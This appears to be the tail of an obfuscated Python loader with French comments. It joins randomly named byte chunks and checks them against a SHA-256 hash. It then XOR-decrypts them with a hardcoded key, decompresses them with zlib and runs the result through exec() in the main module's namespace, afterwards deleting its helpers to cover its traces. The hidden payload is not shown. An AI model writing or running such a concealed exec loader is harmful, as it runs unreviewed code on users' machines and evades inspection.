_cnfOtJ8CEbuLHG + _cmuAklgkHqGZ30 + _cgnSlBSETeDHH_ + _cj_67AX4kWOjKn + _cbt3wwfvtnqRBd + _cgXbvyD6h6sY39 + _ce14MJtQbPl4qd + _ceLgxFZNfTdXZM + _cuGceZ3kfj1pjy + _chXX9Xn5QX4BA2 + _cdiwJMcJPurVrq + _cde1MzGVs7NHhl + _clS1pHNUExmOux + _cc0pHU8wPXPSQf + _cscbBYL7oKssx_ + _cpIrWmiiSDy9dm + _ctnhGtjlmN0b3p + _ccrwf8Ssauf3Xg + _cbV164d3eAgzTt + _cotWcSC1tUi34y + _c_RqSaSeRvyr4d + _cemqGGxk62foMP + _cr2pE8SLMB0YRD + _cx7e5kMxvXQMTz + _cbG6SKIt6zeyvZ + _cpC72amkWGhdpv + _cpmng4cPMni2Ih + _cmxlA7Py3TWeae + _co1sYa2JWRGxuj + _cabzC35bM8pKxh + _ccMG1KKvOy_BiX + _cjcpAzY0rhZVi2 + _cxBIeG3cXjMHfI + _cn4vpQMeXeU13q + _ch86bRTFo9jqza + _cizPgCaqMWGqNM + _ceGzSZPlaqCvxV + _cua_aJ7Z6NhBy_ + _cgVuKJN73BJuTL + _cj6IPejy4WRbLR + _cy9aeALvrFcB6Q + _cnNdS3O2FRZKGx + _chZGvdIBgTp0kp + _csg5ufLLEAaaR4 + _czLuvZCy2lBg76 + _ccIzCBsYLq0Gip + _ca8LY_9yUFkxe7 + _ciMbgV5l9GHz3L + _csyWqQKX_YgcBE + _ceSMF0Jko7WhSu + _ccuwUjjbQfDmVA + _cfc9vmObqXmn6U + _ca0yJuMmgDhXqY + _cjD7s3OMry2OZU + _ck6P6MP2q0UGyP + _cnYcPRbfi2Pp0C + _cu9qC4aKlhM0VF + _czAByG8bv97CkM + _cmIzDtRke1xtr0 + _cqxLNS8vUFrlzM + _czWI39emazz3Gy + _cgoetVVttUfNOI + _c_KJYIs08FgnE3 + _cmMF171QlBmw0P + _cjLJ6q6Ochb_By + _ci65reIlywAaIL + _cbVLQztbcCRblg + _chRLdoYiWbhGUN)
if __import__('hashlib').sha256(_pn32oFfQSD5lHu).hexdigest() != '8ee47cf4e5e2239d3e916e56792329bcf374ea5916ab37e61f70bf3de30c43a2':
    __import__('sys').exit(1)
_xiHRkYF5IRpKY7 = bytes([124, 194, 78, 10, 44, 167, 166, 184, 156, 213, 64, 42, 67, 45, 32, 143, 43, 177, 175])
_fkx_JhZS9nXvbn7 = bytes([70, 132, 47, 230, 181, 202, 75, 84, 144, 221, 74, 72, 38, 44, 3, 239, 220, 227, 239])

def _fxmQe0NK5dNaFEM(_bkq2zBdby97jek, _kzw7LfZ3MJ2pKN):
    return bytes(_bkq2zBdby97jek[_invUqoMT6FsZXU] ^ _kzw7LfZ3MJ2pKN[_invUqoMT6FsZXU % len(_kzw7LfZ3MJ2pKN)] for _invUqoMT6FsZXU in range(len(_bkq2zBdby97jek)))

def _fdecmABgXF1pEB7(_tktWwV3Rp39PUe):
    import zlib
    return zlib.decompress(_tktWwV3Rp39PUe) # Un seul niveau de zlib ici pour simplifier

def _feoufJCia3vMfz0():
    import sys, builtins
    # 1. Déchiffrement XOR
    _x_GkAD9m14m_JY = _fxmQe0NK5dNaFEM(_pn32oFfQSD5lHu, _xiHRkYF5IRpKY7)
    # 2. Décompression Zlib
    _dhPtqmKdEWANvd = _fdecmABgXF1pEB7(_x_GkAD9m14m_JY)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dhPtqmKdEWANvd.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _n_51HvTMB_k1gw = _main.__dict__
    _n_51HvTMB_k1gw.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _n_51HvTMB_k1gw)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_feoufJCia3vMfz0()
try:
    del _fxmQe0NK5dNaFEM, _fdecmABgXF1pEB7, _feoufJCia3vMfz0
    del _pn32oFfQSD5lHu, _xiHRkYF5IRpKY7, _fkx_JhZS9nXvbn7
except:
    pass
